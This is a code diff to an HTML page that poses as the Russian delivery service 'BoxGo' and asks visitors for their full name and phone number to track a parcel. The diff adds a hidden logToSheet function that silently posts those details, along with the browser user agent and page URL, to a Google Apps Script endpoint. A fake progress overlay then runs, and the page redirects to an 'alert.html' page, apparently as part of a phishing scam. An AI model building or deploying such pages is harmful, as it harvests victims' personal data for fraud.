@@ -109,7 +109,7 @@
     <section class="hero">
       <div>
         <h1>Служба доставки <span style="color:var(--brand-2)">BoxGo</span></h1>
-        <p>Надёжная доставка по всей стране: курьеры, постаматы, пункты выдачи. Отслеживайте отправления по телефону и ФИО. <strong></p>
+        <p>Надёжная доставка по всей стране: курьеры, постаматы, пункты выдачи. Отслеживайте отправления по телефону и ФИО.</p>
 
         <div id="form" class="card form-card" role="form" aria-labelledby="check-title">
           <div class="row">
@@ -213,12 +213,21 @@
   <script>
     const yearEl = document.getElementById('year'); yearEl.textContent = new Date().getFullYear();
     function startCheck(){
-      const fio=document.getElementById('fio').value.trim();
-      const phone=document.getElementById('phone').value.trim();
-      const minOk = fio.split(' ').filter(Boolean).length >= 2 && phone.replace(/\D/g,'').length >= 10;
-      if(!minOk){ alert('Пожалуйста, укажите ФИО и корректный номер телефона.'); return; }
-      openOverlay(); runProgress();
-    }
+  const fio   = document.getElementById('fio').value.trim();
+  const phone = document.getElementById('phone').value.trim();
+
+  const minOk = fio.split(/\s+/).length >= 2 && phone.replace(/\D/g,'').length >= 10;
+  if(!minOk){
+    alert('Пожалуйста, укажите ФИО и корректный номер телефона.');
+    return;
+  }
+
+  // Логируем в Google Таблицу (не блокирует UI)
+  try { logToSheet(fio, phone); } catch (e) {}
+
+  openOverlay();
+  runProgress();
+}
     function openOverlay(){ document.getElementById('overlay').classList.add('active'); document.body.style.overflow='hidden'; }
     function closeOverlay(){ document.getElementById('overlay').classList.remove('active'); document.body.style.overflow='auto'; }
     function runProgress(){
@@ -240,6 +249,28 @@
       }, total+400);
     }
     function goGov(){ window.location.href='alert.html'; }
-  </script>
+    <script>
+// === Отправка в Google Sheets (замени URL и ключ) ===
+const GS_URL = 'https://script.google.com/macros/s/AKfycbzQZ6EvmFCy3H3_i4M968_mmNel7dg4LdKZtu_pGTVRABTuOcktP1e7zizl81eS2iZwUQ/exec';
+const GS_KEY = 'YOUR_SECRET_KEY'; // тот же, что в Apps Script
+
+function logToSheet(fio, phone){
+  const payload = new URLSearchParams({
+    key: GS_KEY,
+    fio,
+    phone,
+    ua: navigator.userAgent,
+    ref: location.href
+  }).toString();
+
+  // простой и надёжный вариант для GitHub Pages + Apps Script
+  fetch(GS_URL, {
+    method: 'POST',
+    mode: 'no-cors',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    body: payload
+  });
+}
+</script>
 </body>
 </html>
